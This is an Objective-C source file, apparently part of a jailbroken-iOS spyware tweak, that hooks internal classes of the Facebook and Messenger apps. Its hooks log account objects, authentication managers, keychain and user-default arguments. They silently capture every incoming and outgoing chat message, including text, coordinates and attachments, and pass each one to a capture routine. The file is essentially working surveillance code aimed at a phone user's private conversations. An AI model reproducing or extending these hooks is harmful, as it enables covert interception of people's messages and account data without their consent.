//
//  Facebook.h
//  MSFSP
//
//  Created by Makara Khloth on 12/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "FacebookUtils.h"

#import "FBMThread.h"
#import	"ThreadMessage.h"
#import "BatchThreadCreator.h"
#import "ThreadsFetcher.h"
#import "FBMRequest.h"
#import "FBThreadListController.h"
#import "FBMThreadSet.h"
#import "JKArray.h"
#import "JKDictionary.h"
#import "JKDictionaryEnumerator.h"
#import "FBAuthenticationManagerImpl.h"
#import "FBMessengerModuleAuthenticationManager.h"
#import "FBSSOLoginController.h"
#import "FBAccountStore.h"
#import "ACAccount.h"
#import "ACAccount-FBFoundation.h"
#import "MQTTMessageSender.h"


#pragma mark -
#pragma mark FBSSOLoginController capture target account (does not work)
#pragma mark -

HOOK(FBSSOLoginController, account, id) {
	ACAccount *account = CALL_ORIG(FBSSOLoginController, account);
	DLog (@"------------------------------- account -----------------------------------");
	DLog (@"identifier = %@", [account identifier]);
	DLog (@"accountDescription = %@", [account accountDescription]);
	DLog (@"username = %@", [account username]);
	DLog (@"isValid = %@", [account isValid]);
	DLog (@"------------------------------- account -----------------------------------");
	return account;
}

HOOK(FBSSOLoginController, accountStore, id) {
	FBAccountStore *accountStore = CALL_ORIG(FBSSOLoginController, accountStore);
	DLog (@"------------------------------- accountStore -----------------------------------");
	DLog (@"appID = %@", [accountStore appID]);
	DLog (@"accounts = %@", [accountStore accounts]);
	DLog (@"------------------------------- accountStore -----------------------------------");
	return accountStore;
}

#pragma mark -
#pragma mark FBAuthenticationManagerImpl capture target account
#pragma mark -

// For messenger application
HOOK (FBAuthenticationManagerImpl, initWithProviderMapData$, id, id arg1) {
	DLog (@"------------------------------- argument -----------------------------------");
	DLog (@"[arg1 class] = %@", [arg1 class]);
	DLog (@"arg1 = %@", arg1);
	DLog (@"------------------------------- argument -----------------------------------");
	FBAuthenticationManagerImpl *fbAuthenManagerImpl = CALL_ORIG(FBAuthenticationManagerImpl, initWithProviderMapData$, arg1);
	[[FacebookUtils shareFacebookUtils] setMFBAuthenManagerImpl:fbAuthenManagerImpl];
	
	DLog(@"------- FBAuthenticationManagerImpl -----------");
	DLog (@"fbAuthenManagerImpl = %@", fbAuthenManagerImpl);
	//DLog (@"meUser = %@", [fbAuthenManagerImpl meUser]); // Likely to renmae to mailboxViewer
	DLog (@"users = %@", [fbAuthenManagerImpl users]);
	DLog (@"defaults = %@", [fbAuthenManagerImpl defaults]);
	DLog(@"------- FBAuthenticationManagerImpl -----------");
	
	return fbAuthenManagerImpl;
}

HOOK (FBAuthenticationManagerImpl, initWithUsers$keychainProvider$userDefaults$, id, id arg1, id arg2, id arg3) {
	DLog (@"------------------------------- argument -----------------------------------");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	DLog (@"[arg3 class] = %@, arg3 = %@", [arg3 class], arg3);
	DLog (@"------------------------------- argument -----------------------------------");
	FBAuthenticationManagerImpl *fbAuthenManagerImpl = CALL_ORIG(FBAuthenticationManagerImpl, initWithUsers$keychainProvider$userDefaults$, arg1, arg2, arg3);
	[[FacebookUtils shareFacebookUtils] setMFBAuthenManagerImpl:fbAuthenManagerImpl];
	
	DLog(@"------- FBAuthenticationManagerImpl -----------");
	DLog (@"fbAuthenManagerImpl = %@", fbAuthenManagerImpl);
	//DLog (@"meUser = %@", [fbAuthenManagerImpl meUser]); // Likely to renmae to mailboxViewer
	DLog (@"users = %@", [fbAuthenManagerImpl users]);
	DLog (@"defaults = %@", [fbAuthenManagerImpl defaults]);
	DLog(@"------- FBAuthenticationManagerImpl -----------");
	
	return fbAuthenManagerImpl;
}

// For facebook application (class method)
HOOK(FBMessengerModuleAuthenticationManager, authenticationManagerWithSessionStore$, id, id arg1) {
	DLog (@"------------------------------- argument -----------------------------------");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"------------------------------- argument -----------------------------------");
	FBMessengerModuleAuthenticationManager *fbMessengerModuleAuthManager = CALL_ORIG(FBMessengerModuleAuthenticationManager, authenticationManagerWithSessionStore$, arg1);
	[[FacebookUtils shareFacebookUtils] setMFBMessengerModuleAuthManager:fbMessengerModuleAuthManager];
	
	DLog(@"------- FBMessengerModuleAuthenticationManager -----------");
	DLog (@"fbMessengerModuleAuthManager = %@", fbMessengerModuleAuthManager);
	//DLog (@"hasMeUser = %d", [fbMessengerModuleAuthManager hasMeUser]);  // There is no method of hasMeUser in 6.0 onward
	//DLog (@"meUser = %@", [fbMessengerModuleAuthManager meUser]);  // There is no method of meUser in 6.0 onward replaced by mailboxViewer
	
	// ------- For Facebook 6.0.1, 6.0.2 and assume onward --------- 
	// When debug is log for these below lines cause user loss authentication with facebook server (session store is clear) when user logout then login back
	// and result in user cannot use chat service in Facebook application (Facebook application always there is problem with internet connection)
	
	//DLog (@"hasFacebookCredentials = %d", [fbMessengerModuleAuthManager hasFacebookCredentials]);
	//DLog (@"facebookCredentials = %@", [fbMessengerModuleAuthManager facebookCredentials]);
	DLog(@"------- FBMessengerModuleAuthenticationManager -----------");
	
	return fbMessengerModuleAuthManager;
}

#pragma mark -
#pragma mark Capture incoming/outgoing Facebook message for existing thread
#pragma mark -

HOOK(FBMThread, addNewerMessage$, void, id msg) {
	DLog(@"*********** CONGRAT HOOKING FOR function: FBMThread addNewerMessage$ ************");
	CALL_ORIG(FBMThread, addNewerMessage$, msg);
	DLog (@"------------------------------- FBMThread -----------------------------------");
	DLog (@"threadId = %@", [self threadId]);
	DLog (@"name = %@", [self name]);
	DLog (@"numMessages = %d", [self numMessages]);
	DLog (@"picUrl = %@", [self picUrl]);
	DLog (@"picHash = %@", [self picHash]);
	DLog (@"------------------------------- FBMThread -----------------------------------");
	
	DLog (@"------------------------------- ThreadMessage -----------------------------------");
	DLog (@"threadId = %@", [msg threadId]);
	DLog (@"messageId = %@", [msg messageId]);
	DLog (@"text = %d", [msg text]);
	DLog (@"adminText = %@", [msg adminText]);
	DLog (@"offlineThreadingId = %@", [msg offlineThreadingId]);
	DLog (@"logMessage = %@", [msg logMessage]);
	DLog (@"coordinates = %@", [msg coordinates]);
	DLog (@"outgoingAttachments = %@", [msg outgoingAttachments]);
	DLog (@"shareMap = %@", [msg shareMap]);
	DLog (@"attachmentMap = %@", [msg attachmentMap]);
	DLog (@"tags = %@", [msg tags]);
	DLog (@"------------------------------- ThreadMessage -----------------------------------");
	
	ThreadMessage *threadMsg = msg;
	
	FacebookUtils *fbUtils = [FacebookUtils shareFacebookUtils];
	
	if (![[fbUtils mofflineThreadingId] isEqualToString:[threadMsg offlineThreadingId]]) {
		// Since we capture attachment which cause this method call more than one time thus we use messageId
		// to filter the same message
		[fbUtils setMofflineThreadingId:[threadMsg offlineThreadingId]];
		[FacebookUtils captureFacebookMessage:self message:msg];
	}
	
}
//---------------------------------------------------------------------------------
// Alway called but callback of success would go to either
// addNewerMessage$/thread$didSendMessage$ depend on network connection bad/good (observation)
//---------------------------------------------------------------------------------
HOOK(MQTTMessageSender, sendMessage$thread$delegate$, void, id arg1, id arg2, id arg3) {
	DLog (@"------------------------------- argument -----------------------------------");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	DLog (@"[arg3 class] = %@, arg3 = %@", [arg3 class], arg3);
	DLog (@"------------------------------- argument -----------------------------------");
	CALL_ORIG(MQTTMessageSender, sendMessage$thread$delegate$, arg1, arg2, arg3);
}

HOOK(MQTTMessageSender, thread$didSendMessage$, void, id arg1, id arg2) {
	DLog(@"*********** CONGRAT HOOKING FOR function: MQTTMessageSender thread$didSendMessage$ ************");
	DLog (@"------------------------------- argument -----------------------------------");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	DLog (@"------------------------------- argument -----------------------------------");
	CALL_ORIG(MQTTMessageSender, thread$didSendMessage$, arg1, arg2);
	
	FBMThread *thread =  arg1;
	ThreadMessage *msg = arg2;
	
	FacebookUtils *fbUtils = [FacebookUtils shareFacebookUtils];
	
	if (![[fbUtils mofflineThreadingId] isEqualToString:[msg offlineThreadingId]]) {
		[fbUtils setMofflineThreadingId:[msg offlineThreadingId]];
		[FacebookUtils captureFacebookMessage:thread message:msg];
	}
}

#pragma mark -
#pragma mark Capture outgoing Facebook message for newly created thread
#pragma mark -

HOOK(BatchThreadCreator, request$didLoad$, void, id arg1, id arg2) {
	DLog(@"*********** CONGRAT HOOKING FOR function: BatchThreadCreator request$didLoad$ ************");
	/*
	DLog (@"------------------------------- arguments -----------------------------------");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1); // FBMRequest
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2); // JKArray (something JSON is get involved)
	DLog (@"------------------------------- arguments -----------------------------------");
	*/
	CALL_ORIG(BatchThreadCreator, request$didLoad$, arg1, arg2); // To create thread with threadId from the facebook server
	
	
	// Get thread object
	FBMThread *newThread = nil;
	object_getInstanceVariable(self, "_newThread", (void **)&newThread);
	
	// Get message object (it should be only one message inside the newly created thread)
	ThreadMessage *message = nil;
	object_getInstanceVariable(self, "_message", (void **)&message);
	
	DLog (@"------------------ thread message ---------------");
	DLog (@"message = %@", message);
	DLog (@"newThread = %@", newThread);
	DLog (@"------------------ thread message ---------------");
	
	if (newThread && message) {
		Class $ThreadMessage = object_getClass(message);
		message = [$ThreadMessage messageFromMessage:message];
		[message setSendState:3]; // Because of message's _sendState is 0 thus we need to overide to 3 for 'outgoing' direction
		[FacebookUtils captureFacebookMessage:newThread message:message];
	}
}

#pragma mark -
#pragma mark Capture incoming Facebook message for newly created thread
#pragma mark -

HOOK(ThreadsFetcher, request$didLoad$, void, id arg1, id arg2) {
	DLog(@"*********** CONGRAT HOOKING FOR function: ThreadsFetcher request$didLoad$ ************");
	DLog (@"------------------------------- arguments -----------------------------------");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1); // FBMRequest
	DLog (@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2); // Messenger and Facebook version below 5.6 is JKArray; 5.6 up is JKDictionary (something JSON is get involved)
	DLog (@"------------------------------- arguments -----------------------------------");
	
//	FBMRequest *fbmReq = arg1;
	
	Class $JKArray = objc_getClass("JKArray");
	Class $JKDictionary = objc_getClass("JKDictionary");
	
	id obj = nil;
	if ([arg2 isKindOfClass:$JKArray]) {
		JKArray *jka = arg2;
		if ([jka count]) {
			obj = [jka objectAtIndex:0];
		}
	}
	
	DLog (@"------------------------------- thread request -----------------------------------");
//	DLog (@"params = %@", [fbmReq params]);
//	DLog (@"delegate = %@", [fbmReq delegate]);
	DLog (@"[obj class] = %@,", [obj class]);
	DLog (@"obj = %@", obj);
	DLog (@"------------------------------- thread request -----------------------------------");
	
	if ([arg2 isKindOfClass:$JKArray]) { // Facebook version below 5.6 and Messenger
		JKArray *jka = arg2;
		for (JKDictionary *jkd in jka) {
			if ([[jkd objectForKey:@"name"] isEqualToString:@"threads"]) {
				JKArray *fql_result_set = [jkd objectForKey:@"fql_result_set"];
				if ([fql_result_set count]) {
					[[FacebookUtils shareFacebookUtils] setMNumFetchThread:[fql_result_set count]];
				}
				break;
			}
		}
	} else if ([arg2 isKindOfClass:$JKDictionary]) { // Facebook version 5.6 onward
		JKDictionary *jkd = arg2;
		JKArray *jka = [jkd objectForKey:@"data"];
		
		DLog (@"All keys of JKDictionary = %@", [jkd allKeys]);
		
		for (JKDictionary *jkd1 in jka) {
			if ([[jkd1 objectForKey:@"name"] isEqualToString:@"threads"]) {
				JKArray *fql_result_set = [jkd1 objectForKey:@"fql_result_set"];
				if ([fql_result_set count]) {
					[[FacebookUtils shareFacebookUtils] setMNumFetchThread:[fql_result_set count]];
				}
			}
		}
	}
	
	CALL_ORIG(ThreadsFetcher, request$didLoad$, arg1, arg2);
	
	//========================== check all thread fetch for offline thread ======================
	
//	NSFileManager *fileManager = [NSFileManager defaultManager];
//	NSString *path = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
//    path = [path stringByAppendingPathComponent:@"FacebookMID.plist"]; 
//	if ([fileManager fileExistsAtPath: path]){
//		NSMutableDictionary* data = [[NSMutableDictionary alloc] initWithContentsOfFile: path];
//		FBMThreadSet * threadset = nil;
//		object_getInstanceVariable(self, "_threads", (void **)&threadset);
//		
//		NSMutableDictionary * threadByUserId = [threadset threadByUserId];
//		DLog(@"***** plist %@",data);
//		
//		for (int i=0; i < [[threadByUserId allKeys]count]; i++) {
//			FBMThread * threadOfEachUser = [threadset getThreadByUserId:[[threadByUserId allKeys]objectAtIndex:i]];
//			NSArray * messagesOfEachUser = [threadOfEachUser messages];
//			
//			for(int j=0;j<[messagesOfEachUser count];j++ ){
//				BOOL found = NO;
//				ThreadMessage *  threadMessageOfEachUser = [messagesOfEachUser objectAtIndex:j];
//				for(int k=0;k<[[data allKeys]count];k++ ){
//					
//					NSString * tmpoffline =  [data objectForKey:[NSString stringWithFormat:@"%d",k]];
//					if([tmpoffline isEqualToString:[threadMessageOfEachUser offlineThreadingId]]){
//						found =YES;
//						DLog(@"*********************************** BingGo Found");
//					}
//				}
//				if(!found){
//					DLog(@"*********************************** Capture Offline Thread %@",threadMessageOfEachUser);
//					int index = 0;
//
//					NSMutableDictionary* data = [[NSMutableDictionary alloc] initWithContentsOfFile: path];
//
//					index = [[data objectForKey:@"currentindex"]intValue];
//					if(index == 100){
//						index = 1;
//						[data setObject:[NSString stringWithFormat:@"%d",index] forKey:@"currentindex"];
//						[data setObject:[threadMessageOfEachUser offlineThreadingId] forKey:[NSString stringWithFormat:@"%d",index]];
//						DLog(@"data: %@",data);
//						[data writeToFile: path atomically:YES];
//					}else{
//						index = index + 1;
//						[data setObject:[NSString stringWithFormat:@"%d",index] forKey:@"currentindex"];
//						[data setObject:[threadMessageOfEachUser offlineThreadingId] forKey:[NSString stringWithFormat:@"%d",index]];
//						DLog(@"data: %@",data);
//						[data writeToFile: path atomically:YES];
//					}
//					
//					[data release];
//
//					[FacebookUtils captureFacebookMessage:threadOfEachUser message:threadMessageOfEachUser];
//				}
//			}
//		}
//	
//	}
	
}

HOOK(FBThreadListController, didFetchThreads$, void, id arg1) {
	DLog(@"*********** CONGRAT HOOKING FOR function: FBThreadListController didFetchThreads ************");
	/*
	DLog (@"------------------------------- arguments -----------------------------------");
	DLog (@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	DLog (@"------------------------------- arguments -----------------------------------");
	 */
	CALL_ORIG(FBThreadListController, didFetchThreads$, arg1);
	
	FBMThreadSet *threads = arg1;
	
	if ([threads numThreads] && [[FacebookUtils shareFacebookUtils] mNumFetchThread]) {
		[[FacebookUtils shareFacebookUtils] setMNumFetchThread:0];
		id unseenThreads = [threads unseenThreadsList];
		for (FBMThread *thread in unseenThreads) {
			if ([thread numMessages] == 1 && [thread unread]) { // New thread for incoming message
				ThreadMessage *msgObj = [thread newestMessage];
				if (!msgObj) msgObj = [thread newestCompleteMessage];
				DLog (@"1- msgObj = %@", msgObj);
				if (msgObj) { // Other message would send via addNewerMessage$ method
					Class $ThreadMessage = object_getClass(msgObj);
					msgObj = [$ThreadMessage messageFromMessage:msgObj];
					[msgObj setSendState:0]; // Overide send state
					DLog (@"2- msgObj = %@", msgObj);
					[FacebookUtils captureFacebookMessage:thread message:msgObj];
				}
			}
		}
	}
}



